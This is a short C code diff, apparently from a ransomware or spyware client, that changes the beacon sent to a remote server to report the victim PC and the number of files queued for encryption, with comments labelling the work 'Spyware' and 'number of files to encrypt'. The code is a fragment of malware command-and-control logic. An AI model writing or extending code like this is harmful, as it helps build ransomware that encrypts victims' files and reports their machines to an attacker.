@@ -97,8 +97,13 @@ int startclient() {
     //Todo send information about pc, number of files to encrypt
     //Spyware
 
-    char* hey = "first contact";
-    send(client_fd, hey, strlen(hey), 0);
+    char* hey = "PC connected, number of file : ";
+
+    int file_number = count(&queue);
+
+    char ret[64];
+    sprintf(ret, "%s%d", hey, file_number);
+    send(client_fd, ret, strlen(ret), 0);
 
     int *clientfd = malloc(sizeof(int));
     *clientfd = client_fd;
@@ -109,4 +114,5 @@ int startclient() {
     pthread_create(&watcher_tid, NULL, start_watcher, NULL);
     pthread_join(watcher_tid, NULL);
     pthread_join(command_tid, NULL);
+    return client_fd;
 }
